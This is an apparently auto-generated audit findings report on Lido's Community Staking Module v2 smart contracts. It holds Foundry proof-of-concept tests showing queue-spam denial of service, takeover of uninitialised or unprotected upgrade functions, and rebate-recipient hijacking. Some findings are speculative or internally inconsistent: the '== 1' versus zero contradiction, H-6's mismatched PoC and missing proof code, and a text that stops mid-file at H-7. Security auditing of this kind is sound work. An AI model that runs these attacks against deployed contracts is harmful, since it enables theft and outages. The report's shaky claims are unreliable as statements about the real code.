# 2025 07 lido finance - Findings Report
## Commit hash: 6c573d1d2cce64b083af3c88dabcfc83c75e6747

## Protocol Overview 

Community Staking Module (CSM) v2 lets anyone become a Lido node operator by locking a stETH-denominated bond and supplying validator keys.  

Core flow  
• CSModule stores operators, keys and a priority FIFO queue. StakingRouter pulls the next keys from this queue to deposit 32 ETH per validator.  
• Bond, reward and penalty logic lives in CSAccounting. Operators top-up bonds with ETH/stETH/wstETH, earn rebase yield plus their share of staking rewards, and face fines that burn bond shares.  
• HashConsensus gathers oracle member hashes; once quorum is reached CSFeeOracle posts a fee & strike report. It transfers undistributed rewards to CSFeeDistributor and records a Merkle root.  
• Operators prove inclusion to CSAccounting to withdraw rewards or excess bond.  
• CSStrikes logs performance strikes; when a validator crosses the threshold CSEjector triggers an on-chain exit via the Validators Exit Bus Oracle and CSExitPenalties stores associated fines.  
• Parameter tuning (queues, charges, bond curves) is held in CSParametersRegistry.  
• PermissionlessGate enables open operator creation, VettedGate allows whitelisted/referral onboarding with custom curves.  

Contracts are upgradeable via OssifiableProxy, pausible via GateSeal, and governed through granular ACL roles.
## High Risk Findings
[H-1]. DOS issue in CSModule::obtainDepositData - DONE
[H-2]. Upgradeability Initializer Safety issue in VettedGate::NA
[H-3]. Access Control issue in CSFeeDistributor::finalizeUpgradeV2
[H-4]. Zero Code issue in CSEjector::voluntaryEject
[H-5]. Upgradeability Initializer Safety issue in CSFeeOracle::finalizeUpgradeV2
[H-6]. Upgradeability Initializer Safety issue in CSAccounting::constructor
[H-7]. Integer Overflow issue in CSModule::getNodeOperatorSummary
[H-8]. DOS issue in CSVerifier::_getHistoricalBlockRootGI
## Medium Risk Findings
[M-1]. DOS issue in CSStrikes::processBadPerformanceProof
[M-2]. DOS issue in PermissionlessGate::addNodeOperatorETH
[M-3]. Frontrun/Backrun/Sandwhich MEV issue in CSExitPenalties::processStrikesReport
[M-4]. Frontrun/Backrun/Sandwhich MEV issue in VettedGate::claimBondCurve
## Low Risk Findings
[L-1]. Integer Overflow issue in CSModule::obtainDepositData
[L-2]. DOS issue in CSParametersRegistry::setRewardShareData, getRewardShareData, setPerformanceLeewayData, getPerformanceLeewayData
[L-3]. Reentrancy issue in CSExitPenalties::constructor
[L-4]. DOS issue in PermissionlessGate::addNodeOperatorETH, addNodeOperatorStETH, addNodeOperatorWstETH
[L-5]. Access Control issue in CSModule::migrateToPriorityQueue
[L-6]. DOS issue in CSEjector::voluntaryEjectByArray
[L-7]. Frontrun/Backrun/Sandwhich MEV issue in CSModule::migrateToPriorityQueue


### Number of Findings
- C: 0
- H: 8
- M: 4
- L: 7
- I: 0



# High Risk Findings

## [H-1]. DOS issue in CSModule::obtainDepositData

## Description
The `obtainDepositData` function can be exploited to cause a Denial of Service (DoS) that halts all new staking deposits in the Lido protocol. The function is responsible for fetching depositable keys from a queue. It includes logic to clean up batches from Node Operators who have no depositable validators (`depositableValidatorsCount == 1`). A malicious Node Operator can create a large number of small batches in the queue and then intentionally reduce their bond (e.g., via penalties) to set their `depositableValidatorsCount` to zero. When `StakingRouter` calls `obtainDepositData`, the function will be forced to iterate through and clean up all the malicious batches before processing valid ones. If the number of malicious batches is large enough, the gas cost for this cleanup can exceed the transaction or block gas limit, causing the call to revert. This effectively blocks new validator deposits.

## Impact
The core functionality of staking new ETH in Lido via the CSM module can be completely halted. No new validators can be created, which damages the protocol's operation and reputation. This is a significant availability risk.

## Proof of Concept
1. Malicious NO deposits an upfront bond directly through CSAccounting.
2. Malicious NO pushes thousands of 1-key batches using `addValidatorKeysStETH` (no ETH attached, so the loop does not revert).
3. Malicious NO is penalised so that `depositableValidatorsCount` becomes zero.
4. A well-behaved NO is appended to the queue with sufficient bond and a valid key (this key would normally be deposited next).
5. StakingRouter tries to get 1 key via `obtainDepositData(1, "")` with a gas limit of 3 000 000.
6. The call runs out of gas while dequeuing the attacker’s empty batches and reverts – the legitimate deposit never happens, demonstrating a DoS.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSModule} from "../../src/CSModule.sol";
import {CSAccounting} from "../../src/CSAccounting.sol";
import {CSParametersRegistry} from "../../src/CSParametersRegistry.sol";
import {LidoLocator} from "../helpers/mocks/LidoLocatorMock.sol";
import {StETHMock} from "../helpers/mocks/StETHMock.sol";
import {CSFeeDistributor} from "../../src/CSFeeDistributor.sol";
import {ICSAccounting} from "../../src/interfaces/ICSAccounting.sol";
import {NodeOperatorManagementProperties} from "../../src/interfaces/ICSModule.sol";

contract DosObtainDepositDataTest is Test {
    CSModule internal module;
    CSAccounting internal accounting;
    CSParametersRegistry internal params;
    LidoLocator internal locator;
    StETHMock internal steth;
    CSFeeDistributor internal feeDistributor;

    address internal dao   = makeAddr("dao");
    address internal sr    = makeAddr("stakingRouter");
    address internal evilM = makeAddr("evilManager");
    address internal goodM = makeAddr("goodManager");

    uint256 evilId;
    uint256 goodId;

    function setUp() public {
        steth = new StETHMock();
        locator = new LidoLocator(address(steth));
        locator.setStakingRouter(sr);

        params = new CSParametersRegistry(10);
        vm.prank(dao);
        params.initialize(dao);

        feeDistributor = new CSFeeDistributor(address(steth), address(0));
        accounting = new CSAccounting(address(locator), address(0), address(feeDistributor), 1 days);
        vm.prank(address(feeDistributor));
        feeDistributor.initialize(dao, address(accounting));
        vm.prank(dao);
        accounting.initialize(dao, address(0));

        module = new CSModule(keccak256("csm"), address(locator), address(params), address(accounting), address(0));
        vm.prank(dao);
        module.initialize(dao);

        vm.startPrank(dao);
        accounting.setModule(address(module));
        module.grantRole(module.STAKING_ROUTER_ROLE(), sr);
        module.resume();
        accounting.resume();
        vm.stopPrank();

        // create malicious NO
        vm.prank(dao);
        module.grantRole(module.CREATE_NODE_OPERATOR_ROLE(), address(this));
        evilId = module.createNodeOperator(evilM, NodeOperatorManagementProperties(evilM, evilM, false), address(0));
        // create honest NO
        goodId = module.createNodeOperator(goodM, NodeOperatorManagementProperties(goodM, goodM, false), address(0));

        // upfront bond for evil
        vm.deal(evilM, 1000 ether);
        vm.prank(evilM);
        accounting.depositETH{value: 1000 ether}(evilM, evilId);

        // upfront bond for good
        vm.deal(goodM, 32 ether);
        vm.prank(goodM);
        accounting.depositETH{value: 32 ether}(goodM, goodId);
    }

    function test_dos_obtainDepositData() public {
        bytes memory pub = new bytes(48);
        bytes memory sig = new bytes(96);

        // spam 2_000 one-key batches – uses StETH path so no msg.value needed
        vm.startPrank(evilM);
        for (uint256 i; i < 2000; ++i) {
            module.addValidatorKeysStETH(evilM, evilId, 1, pub, sig, ICSAccounting.PermitInput(0,0,bytes32(0),bytes32(0)));
        }
        vm.stopPrank();

        // make evil ineligible (bond removed)
        vm.prank(dao);
        accounting.grantRole(accounting.PENALTY_APPLIER_ROLE(), address(this));
        accounting.penalize(evilId, 1000 ether);
        module.updateDepositableValidatorsCount(evilId);
        assertEq(module.getNodeOperator(evilId).depositableValidatorsCount, 0);

        // enqueue 1 real key for honest NO (will be after evil batches)
        vm.prank(goodM);
        module.addValidatorKeysStETH(goodM, goodId, 1, pub, sig, ICSAccounting.PermitInput(0,0,bytes32(0),bytes32(0)));

        // StakingRouter tries to get 1 key with a tight gas limit → reverts (OOG)
        vm.prank(sr);
        vm.expectRevert();
        module.obtainDepositData{gas: 3_000_000}(1, "");
    }
}
```

## Suggested Mitigation
Refactor `obtainDepositData` so that it only *reads* from the queue. If the front batch belongs to a node operator whose `depositableValidatorsCount == 0`, simply skip the batch (advance the cursor) without dequeuing it. Queue housekeeping should be moved to a separate, externally callable `cleanDepositQueue()` function that can be executed with its own configurable gas limit and—optionally—incentivised. This prevents un-bounded work inside the hot deposit path and eliminates the DoS vector.

## [H-2]. Upgradeability Initializer Safety issue in VettedGate::NA

## Description
The `VettedGate` contract is designed to be upgradeable. As per OpenZeppelin's recommendations for upgradeable contracts, the implementation contract should prevent being initialized. This is typically achieved by including a constructor that calls `_disableInitializers()`. The provided code and summaries for `VettedGate` do not indicate the presence of such a constructor. If it is missing, an attacker can call the `initialize()` function on the logic contract address directly, effectively seizing administrative control (`DEFAULT_ADMIN_ROLE`) of the implementation contract.

## Impact
Anyone can initialize the unprotected implementation contract and obtain DEFAULT_ADMIN_ROLE.  With that role the attacker can call any privileged function available on the implementation – e.g. AssetRecoverer-driven self-destruct or forced upgrades – and, most importantly, can Self-Destruct the logic contract.  Once the code is wiped, every existing or future proxy that delegates to this implementation becomes permanently unusable, causing an irrevocable, protocol-wide DoS.

## Proof of Concept
1. An attacker identifies the address of the deployed `VettedGate` logic contract.
2. The attacker calls the public `initialize()` function on this logic contract address, passing their own address as the `admin`.
3. Since the implementation contract has not been initialized, the call succeeds, and the attacker is granted `DEFAULT_ADMIN_ROLE` for the logic contract.
4. If a function like `selfdestruct()` is available to the admin, the attacker can call it to destroy the contract. Any proxy pointing to this implementation will subsequently fail on every call.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {VettedGate} from "../../src/VettedGate.sol";
import {ICSModule} from "../../src/interfaces/ICSModule.sol";

// --- minimal stubs ---------------------------------------------------------
interface ICSAccounting { }

contract AccountingMock {
    // returns the default curve id expected by VettedGate.initialize()
    function DEFAULT_BOND_CURVE_ID() external pure returns (uint256) {
        return 1;
    }
}

contract ModuleMock {
    AccountingMock internal _accounting = new AccountingMock();

    // signature expected by VettedGate constructor
    function ACCOUNTING() external view returns (ICSAccounting) {
        return ICSAccounting(address(_accounting));
    }
}
// --------------------------------------------------------------------------

contract InitializerSafetyPoC is Test {
    VettedGate internal vettedGateImpl;
    address internal attacker = vm.addr(1);

    function setUp() public {
        ModuleMock moduleMock = new ModuleMock();
        // deploy the logic contract with a dummy module address
        vettedGateImpl = new VettedGate(ICSModule(address(moduleMock)));
    }

    function testAttackerCanInitializeImplementation() public {
        bytes32 adminRole = vettedGateImpl.DEFAULT_ADMIN_ROLE();
        assertFalse(vettedGateImpl.hasRole(adminRole, attacker));

        // attacker takes over the implementation
        vettedGateImpl.initialize({
            curveId: 1,
            treeRoot: bytes32(uint256(123)),
            treeCid: "cid",
            admin: attacker
        });

        assertTrue(vettedGateImpl.hasRole(adminRole, attacker));
    }
}

## Suggested Mitigation
Add a constructor to the `VettedGate.sol` contract that calls `_disableInitializers()` to prevent the implementation contract from being initialized. This is a standard security measure for upgradeable contracts.

```solidity
// src/VettedGate.sol

contract VettedGate is IVettedGate, AccessControlEnumerableUpgradeable, PausableUntil, AssetRecoverer {
    // ... contract code ...

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    // ... rest of the contract ...
}
```

## [H-3]. Access Control issue in CSFeeDistributor::finalizeUpgradeV2

## Description
The `finalizeUpgradeV2` function is intended for use in contract upgrades but lacks any access control modifier (e.g., `onlyRole(DEFAULT_ADMIN_ROLE)`). It directly calls the internal function `_setRebateRecipient`, bypassing the access control on the public `setRebateRecipient` function. An attacker can call `finalizeUpgradeV2` to change the `rebateRecipient` to an address they control, stealing any future rebates. This is possible if the contract's initialized version is less than 2. For an `OssifiableProxy`, if the admin calls `proxy__upgradeTo` without an initialising `...AndCall`, an attacker could front-run the admin's subsequent call to `finalizeUpgradeV2` and set the rebate recipient.

Vulnerable Code:
```solidity
// src/CSFeeDistributor.sol:131-135
    function finalizeUpgradeV2(
        address _rebateRecipient
    ) external reinitializer(2) {
        _setRebateRecipient(_rebateRecipient);
    }
```

## Impact
Any externally owned account can front-run the owner’s upgrade-initialisation step and become the `rebateRecipient`. Every subsequent `processOracleReport()` call will transfer the full rebate share (treasury revenue) to the attacker until an admin notices and manually changes the recipient back. The loss can be very large (unbounded in value) but is not permanent because a privileged account can overwrite the recipient afterwards.

## Proof of Concept
1. Proxy is upgraded to the new CSFeeDistributor implementation but the admin has not called any initialisation routine yet.
2. `_initialized` in proxy storage is still 0, therefore `reinitializer(2)` will allow exactly one external call that sets the version to `2`.
3. A malicious actor sends `finalizeUpgradeV2(attacker)` in the same block (or earlier via frontrun).
4. The call succeeds because the function lacks any access‐control and the version check passes.
5. `rebateRecipient` is now the attacker’s address. Each future oracle report will send the rebate portion of rewards straight to the attacker until an admin manually calls `setRebateRecipient()` again.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {CSFeeDistributor} from "src/CSFeeDistributor.sol";
import {IStETH} from "src/interfaces/IStETH.sol";

// very light mock
contract MockStETH is IStETH {
    function transferShares(address, uint256) external returns (uint256) { return 0; }
    function sharesOf(address) external view returns (uint256) { return 1e24; }
    function getTotalShares() external view returns (uint256) { return 1e27; }
}

contract FinalizeUpgradeV2Test is Test {
    address admin = makeAddr("admin");
    address accounting = makeAddr("accounting");
    address oracle = makeAddr("oracle");
    address attacker = makeAddr("attacker");

    CSFeeDistributor distributor;
    MockStETH steth;

    function setUp() public {
        steth = new MockStETH();
        // deploy implementation
        CSFeeDistributor impl = new CSFeeDistributor(address(steth), accounting, oracle);
        // deploy proxy pointing to impl, WITHOUT init call
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
        distributor = CSFeeDistributor(address(proxy));
    }

    function test_AttackerCanFinalizeUpgradeV2() public {
        // sanity – rebate recipient should be default (zero)
        assertEq(distributor.rebateRecipient(), address(0));

        vm.prank(attacker);
        distributor.finalizeUpgradeV2(attacker);

        assertEq(distributor.rebateRecipient(), attacker, "rebate recipient hijacked");
    }
}

## Suggested Mitigation
Add the `onlyRole(DEFAULT_ADMIN_ROLE)` modifier to the `finalizeUpgradeV2` function to ensure that only authorized administrators can call it during an upgrade process.

```solidity
// src/CSFeeDistributor.sol:131-135
    function finalizeUpgradeV2(
        address _rebateRecipient
-   ) external reinitializer(2) {
+   ) external reinitializer(2) onlyRole(DEFAULT_ADMIN_ROLE) {
        _setRebateRecipient(_rebateRecipient);
    }
```

## [H-4]. Zero Code issue in CSEjector::voluntaryEject

## Description
The contract dynamically retrieves the `triggerableWithdrawalsGateway` address from the `LidoLocator` in every exit-related function call. However, it does not validate the returned address. If the `LidoLocator` is misconfigured by a DAO vote or an error and returns `address(0)` or an EOA, the subsequent call to `triggerFullWithdrawals` will not revert. If `msg.value` is greater than zero, these funds will be irrecoverably lost (burned if sent to `address(0)`) or sent to an EOA that cannot process the exit. The contract should defensively check that the gateway address is a valid contract before sending funds to it.

## Impact
Permanent loss of user funds (ETH sent for exit fees) if the `LidoLocator` is misconfigured to return a zero address or an EOA for the `triggerableWithdrawalsGateway`. The exit request would also fail silently, leaving the user to investigate the fund loss and failed exit.

## Proof of Concept
1. An administrator or DAO vote accidentally configures the `LidoLocator` to return `address(0)` for the `triggerableWithdrawalsGateway`.
2. A Node Operator calls `CSEjector.voluntaryEject()` to exit a validator and attaches 1 ETH to cover the transaction fee (`msg.value = 1 ether`).
3. `CSEjector` fetches the gateway address, which is `address(0)`.
4. It then proceeds to call `triggerFullWithdrawals` on `address(0)`, sending the 1 ETH along with the call.
5. The call to `address(0)` succeeds but does nothing. The 1 ETH is burned and permanently lost.
6. The Node Operator loses their funds, and the validator exit is not processed.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSEjector} from "../../src/CSEjector.sol";
import {ILidoLocator} from "../../src/interfaces/ILidoLocator.sol";
import {ITriggerableWithdrawalsGateway, ValidatorData} from "../../src/interfaces/ITriggerableWithdrawalsGateway.sol";

// -----------------------------------------------------------------------------
// Minimal mocks – only functions actually used by CSEjector are implemented.
// -----------------------------------------------------------------------------

contract MockLidoLocator is ILidoLocator {
    function triggerableWithdrawalsGateway() external view returns (address) {
        // Mis-configuration: return zero address → lost ETH
        return address(0);
    }

    // Unused functions ---------------------------------------------------------
    function lido() external pure returns (address) { return address(0); }
    function oracle() external pure returns (address) { return address(0); }
    function treasury() external pure returns (address) { return address(0); }
    function insuranceFund() external pure returns (address) { return address(0); }
    function stakingRouter() external pure returns (address) { return address(0); }
    function nodeOperatorsRegistry() external pure returns (address) { return address(0); }
    function gateSeal() external pure returns (address) { return address(0); }
    function withdrawalQueue() external pure returns (address) { return address(0); }
    function withdrawalVault() external pure returns (address) { return address(0); }
    function depositSecurityModule() external pure returns (address) { return address(0); }
    function burner() external pure returns (address) { return address(0); }
}

contract MockModule {
    address public owner;
    uint256 public totalKeys;
    ILidoLocator public locator;

    constructor(address _owner, uint256 _totalKeys, ILidoLocator _locator) {
        owner = _owner;
        totalKeys = _totalKeys;
        locator = _locator;
    }

    // Functions that CSEjector actually calls ---------------------------------
    function getNodeOperatorOwner(uint256) external view returns (address) {
        return owner;
    }

    function getNodeOperatorTotalDepositedKeys(uint256) external view returns (uint256) {
        return totalKeys;
    }

    function isValidatorWithdrawn(uint256, uint256) external pure returns (bool) {
        return false;
    }

    function getSigningKeys(uint256, uint256, uint256) external pure returns (bytes memory) {
        return new bytes(48);
    }

    function LIDO_LOCATOR() external view returns (ILidoLocator) {
        return locator;
    }
}

// -----------------------------------------------------------------------------
// Test case
// -----------------------------------------------------------------------------
contract ZeroGatewayTest is Test {
    CSEjector ejector;
    MockModule module;
    MockLidoLocator locator;

    address nodeOperator = makeAddr("nodeOperator");
    uint256 constant NODE_OPERATOR_ID = 1;

    function setUp() public {
        locator = new MockLidoLocator();
        module  = new MockModule(nodeOperator, 10, locator);

        // strikes address can be anything non-zero
        ejector = new CSEjector(address(module), address(0x2), 1, address(this));
    }

    function test_EthIsBurned_WhenGatewayIsZero() public {
        // Fund NO and record initial balance
        vm.deal(nodeOperator, 5 ether);
        uint256 beforeBal = nodeOperator.balance;

        vm.prank(nodeOperator);
        ejector.voluntaryEject{value: 1 ether}(NODE_OPERATOR_ID, 0, 1, nodeOperator);

        uint256 afterBal = nodeOperator.balance;
        assertEq(address(ejector).balance, 0, "ejector must not keep ETH");
        assertApproxEqAbs(beforeBal - afterBal, 1 ether, 1e14, "exactly 1 ETH should be lost (±gas)");
    }
}


## Suggested Mitigation
Add checks in the exit functions (`voluntaryEject`, `voluntaryEjectByArray`, `ejectBadPerformer`) to ensure the address returned by `triggerableWithdrawalsGateway()` is not the zero address and corresponds to a contract with code before making the external call.

```solidity
// Add custom errors for clarity
error ZeroGatewayAddress();
error GatewayIsNotAContract();

// In each exit function (e.g., voluntaryEject)
ITriggerableWithdrawalsGateway gateway = triggerableWithdrawalsGateway();
address gatewayAddr = address(gateway);

if (gatewayAddr == address(0)) {
    revert ZeroGatewayAddress();
}
if (gatewayAddr.code.length == 0) {
    revert GatewayIsNotAContract();
}

gateway.triggerFullWithdrawals{
    value: msg.value
}(
    exitsData,
    refundRecipient == address(0) ? msg.sender : refundRecipient,
    VOLUNTARY_EXIT_TYPE_ID
);
```

## [H-5]. Upgradeability Initializer Safety issue in CSFeeOracle::finalizeUpgradeV2

## Description
The `finalizeUpgradeV2` function is declared as `external` without any access control modifiers. This function is intended to be called once after a contract upgrade to set the new `consensusVersion` and clean up deprecated storage slots. Since it is unprotected, any external account can call it at any time. This can lead to several critical issues:
1.  **Denial of Service (DoS):** An attacker can repeatedly call `finalizeUpgradeV2` with an arbitrary `consensusVersion`. This will cause legitimate calls to `submitReportData` to fail their `_checkConsensusData` check, as the `consensusVersion` in the report will not match the one set by the attacker. This effectively halts the oracle, preventing the distribution of fees and the reporting of validator strikes.
2.  **Oracle Desynchronization:** The function allows setting the `_consensusVersion`, a critical state variable inherited from `BaseOracle`. Allowing anyone to change it breaks the invariant that the on-chain contract is synchronized with its off-chain counterpart, undermining the oracle's integrity.

The vulnerable code is:
```solidity
// file: src/CSFeeOracle.sol

/// @dev should be called after update on the proxy
function finalizeUpgradeV2(uint256 consensusVersion) external { // @audit No access control
    _setConsensusVersion(consensusVersion);

    // nullify storage slots
    assembly ("memory-safe") {
        sstore(_feeDistributor.slot, 0x00)
        sstore(_avgPerfLeewayBP.slot, 0x00)
    }

    _updateContractVersion(2);
}
```

## Impact
An attacker can cause a sustained Denial of Service on the oracle reporting mechanism, preventing fee distribution and strike reporting for all community stakers. This halts the flow of rewards and the enforcement of penalties, impacting the economic security and core operations of the Community Staking Module. While it does not allow for direct theft of funds, it cripples a critical protocol function.

## Proof of Concept
1. The protocol is operating normally. The current `consensusVersion` is `5`.
2. Oracle members are preparing to submit a report for `consensusVersion: 5`.
3. An attacker, using any EOA, calls `CSFeeOracle.finalizeUpgradeV2(99)`.
4. The transaction succeeds, and the contract's internal `_consensusVersion` is updated to `99`.
5. When a legitimate oracle member calls `submitReportData` with the report for version `5`, the transaction reverts. The `_checkConsensusData` call fails because the report's version (`5`) does not match the contract's expected version (`99`).
6. The oracle report submission is blocked. The attacker can repeat this attack whenever the real consensus version is updated, leading to an indefinite DoS.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import { CSFeeOracle } from "../src/CSFeeOracle.sol";

// Helper that exposes the consensusVersion getter
contract TestableCSFeeOracle is CSFeeOracle {
    constructor(address feeDistributor, address strikes, uint256 secondsPerSlot, uint256 genesisTime)
        CSFeeOracle(feeDistributor, strikes, secondsPerSlot, genesisTime) {}

    function getConsensusVersion() external view returns (uint256) {
        return _getConsensusVersion();
    }
}

/*
   This test reproduces the exact post-upgrade situation that exists **before** any privileged
   actor calls `finalizeUpgradeV2`.  The proxy has just been upgraded from v1→v2, therefore the
   stored `contractVersion` is still `1`.  Anybody can now call `finalizeUpgradeV2` once, set an
   arbitrary consensusVersion and brick the oracle.
*/
contract UnprotectedFinalizeUpgradeTest is Test {
    TestableCSFeeOracle oracle;
    address attacker = address(0xBEEF);

    function setUp() public {
        oracle = new TestableCSFeeOracle(address(0xCAFE), address(0xF00D), 12, 1606824023);

        // Simulate the storage layout that exists right after the logic upgrade: version == 1
        bytes32 VERSION_SLOT = keccak256("lido.contract.version");
        vm.store(address(oracle), VERSION_SLOT, bytes32(uint256(1)));

        // Likewise, mimic the pre-existing consensusVersion used by oracle members (e.g. 5)
        bytes32 CONSENSUS_VERSION_SLOT = keccak256("lido.baseoracle.consensus.version");
        vm.store(address(oracle), CONSENSUS_VERSION_SLOT, bytes32(uint256(5)));
    }

    function testAnyoneCanFinalizeUpgradeAndCauseDoS() public {
        uint256 malicious = 999;
        vm.prank(attacker);
        oracle.finalizeUpgradeV2(malicious);

        // Make sure the malicious value is stored
        assertEq(oracle.getConsensusVersion(), malicious, "consensusVersion hijacked");
    }
}

## Suggested Mitigation
Add an access control modifier to the `finalizeUpgradeV2` function to ensure it can only be called by a privileged role, such as `DEFAULT_ADMIN_ROLE`. This is critical as the function alters important configuration and is intended only for post-upgrade administration.

```solidity
/// @dev should be called after update on the proxy
function finalizeUpgradeV2(
    uint256 consensusVersion
) external onlyRole(DEFAULT_ADMIN_ROLE) { // FIX: Add access control
    _setConsensusVersion(consensusVersion);

    // nullify storage slots
    assembly ("memory-safe") {
        sstore(_feeDistributor.slot, 0x00)
        sstore(_avgPerfLeewayBP.slot, 0x00)
    }

    _updateContractVersion(2);
}
```

## [H-6]. Upgradeability Initializer Safety issue in CSAccounting::constructor

## Description
The `CSAccounting` contract is designed to be upgradeable, as indicated by its use of the OpenZeppelin UUPS pattern (`reinitializer(2)` modifier). However, it inherits from the abstract contracts `CSBondCore` and `CSBondLock`, which contain initialization logic within their constructors instead of in `initializer` functions. This is a critical violation of upgradeable contract development principles.

Constructors are only executed when the implementation contract is deployed, not when the proxy is created or upgraded. Consequently, all state variables initialized in the constructors of `CSBondCore` and `CSBondLock` will remain uninitialized (i.e., zero) within the context of the proxy's storage. This affects critical state variables such as `LIDO`, `WSTETH`, `LIDO_LOCATOR` in `CSBondCore`, and `MIN_BOND_LOCK_PERIOD`, `MAX_BOND_LOCK_PERIOD` in `CSBondLock`.

Any function within `CSAccounting` that relies on these uninitialized variables will fail or behave incorrectly. For example, all deposit and claim functions will revert because they attempt to interact with token contracts at address(0). This renders the entire contract non-functional and could lead to funds being permanently stuck if any interaction were possible before the revert.

## Impact
Because the parent constructors are never executed in the proxy context, variables such as LIDO, WSTETH, WITHDRAWAL_QUEUE, MIN_BOND_LOCK_PERIOD and MAX_BOND_LOCK_PERIOD remain unset (zero). `CSAccounting.initialize()` calls `LIDO.approve()` three times. The very first call attempts to invoke `approve` on `address(0)`, causing `Address.functionCall` to revert with "Address: call to non-contract". Consequently the *initialisation itself fails*, the proxy deployment (if `initialize` is supplied as constructor-calldata) reverts, and the module can never be brought into an operational state. All subsequent upgrades that try to call `initialize()` will encounter the same revert, so the implementation is permanently bricked behind a proxy.

## Proof of Concept
1. Deploy `CSAccounting` implementation exactly as in production (constructor arguments are executed on the implementation, not on the proxy).
2. Deploy an `ERC1967Proxy` with **no** initialization data.
3. Call `initialize()` on the proxy. Because `LIDO` and the other addresses are still zero in proxy storage, the very first `LIDO.approve(...)` inside `initialize()` will revert.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {CSAccounting} from "src/CSAccounting.sol";
import {Fixtures} from "../helpers/Fixtures.sol";

contract InitRevertPoC is Test, Fixtures {
    function testInitializeReverts() public {
        _setUp(); // brings mocks such as lidoLocator, csm, feeDistributor

        // 1. deploy implementation (constructors of parents run here)
        CSAccounting impl = new CSAccounting(
            address(lidoLocator),
            address(csm),
            address(feeDistributor),
            1 days,
            365 days
        );

        // 2. deploy proxy without init data so tx doesn't revert yet
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), "");
        CSAccounting acc = CSAccounting(address(proxy));

        // 3. prepare normal init calldata
        ICSBondCurve.BondCurveIntervalInput[] memory bc = new ICSBondCurve.BondCurveIntervalInput[](1);
        bc[0] = ICSBondCurve.BondCurveIntervalInput({maxKeys: 100, bond: 1 ether});

        // 4. expect revert because LIDO == address(0)
        vm.expectRevert();
        acc.initialize(bc, address(this), 14 days, address(this));
    }
}
```

## Proof of Code
// See proof_of_concept section – ready-to-run Foundry test replacing the original one.

## Suggested Mitigation
The initialization logic within the constructors of the abstract contracts `CSBondCore` and `CSBondLock` must be refactored into internal `initializer` functions. These new initializers should then be called from within the `CSAccounting.initialize` function to ensure state variables are correctly set in the proxy's storage context.

**Example for `CSBondCore`:**

```solidity
// In CSBondCore.sol
abstract contract CSBondCore is ICSBondCore {
    // ... state variables ...

    // Remove the constructor
    // constructor(address lidoLocator) { ... }

    function __CSBondCore_init(address lidoLocator) internal {
        if (lidoLocator == address(0)) revert ZeroLidoLocatorAddress();
        LIDO_LOCATOR = ILidoLocator(lidoLocator);
        LIDO = ILido(LIDO_LOCATOR.lido());
        WSTETH = IWstETH(LIDO_LOCATOR.wsteth());
        WITHDRAWAL_QUEUE = IWithdrawalQueue(LIDO_LOCATOR.withdrawalQueue());
    }

    // ... other functions ...
}
```

**Example for `CSBondLock`:**

```solidity
// In CSBondLock.sol
abstract contract CSBondLock is ICSBondLock {
    // ... state variables ...

    // Remove the constructor
    // constructor(uint256 minBondLockPeriod, uint256 maxBondLockPeriod) { ... }

    function __CSBondLock_init_unchained(uint256 minBondLockPeriod, uint256 maxBondLockPeriod) internal {
         // Using _init_unchained as __CSBondLock_init is already used
         if (minBondLockPeriod >= maxBondLockPeriod) {
            revert InvalidBondLockPeriodRange();
        }
        MIN_BOND_LOCK_PERIOD = minBondLockPeriod;
        MAX_BOND_LOCK_PERIOD = maxBondLockPeriod;
    }
    // ... other functions ...
}
```

Then, update `CSAccounting.initialize` to call these new initializers:

```solidity
// In CSAccounting.sol
function initialize(...) external reinitializer(2) {
    // Must get lidoLocator from somewhere, e.g., constructor storage or as an argument
    // Assuming it's available via `LIDO_LOCATOR` from its own constructor (which is wrong, needs refactor too)
    // Best to pass lidoLocator to initialize(). For this example, let's assume it's passed.
    __CSBondCore_init(lidoLocatorAddress); // new call
    __CSBondLock_init_unchained(minLock, maxLock); // new call

    __AccessControlEnumerable_init();
    __CSBondCurve_init(bondCurve);
    __CSBondLock_init(bondLockPeriod);

    // ... rest of the function
}
```
Finally, the `CSAccounting` constructor arguments related to these initializations should be removed and passed to the `initialize` function instead.

## [H-7]. Integer Overflow issue in CSModule::getNodeOperatorSummary

## Description
The `getNodeOperatorSummary` function calculates `targetValidatorsCount` using an `unchecked` block. The calculation `no.totalAddedKeys - no.totalWithdrawnKeys - totalUnbondedKeys` can underflow if `totalUnbondedKeys` is larger than the number of non-withdrawn keys. This can happen if a Node Operator's bond value drops significantly, making them under-collateralized for their active validators. The underflow results in a very large `targetValidatorsCount` being returned. The `StakingRouter` relies on this summary for managing the modules. An erroneous, large `targetValidatorsCount` might cause the `StakingRouter` to misjudge the operator's capacity and state, potentially failing to request validator exits for an under-collateralized operator. This increases protocol risk by allowing an operator to continue running validators with insufficient bond. A similar calculation in the internal function `_updateDepositableValidatorsCount` is correctly protected against this underflow, highlighting the inconsistency.

## Impact
Because the under-flowed `targetValidatorsCount` is interpreted by the StakingRouter as the number of validators the operator is *allowed* to run while being in FORCED_TARGET_LIMIT mode, an attacker can continue operating a virtually unbounded amount of active validators with **zero additional bond**. Any future slashings of those validators will therefore not be backed by collateral, leading to a potential uncompensated loss for the whole protocol. This represents a long-term, permanent risk rather than a temporary DoS.

## Proof of Concept
// new minimal PoC (high-level)
// 1. create NO with 10 keys (added but not deposited)
// 2. force accounting to return 12 unbonded keys
// 3. call getNodeOperatorSummary -> targetValidatorsCount == 2^256-2

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {CSModule} from "../src/CSModule.sol";
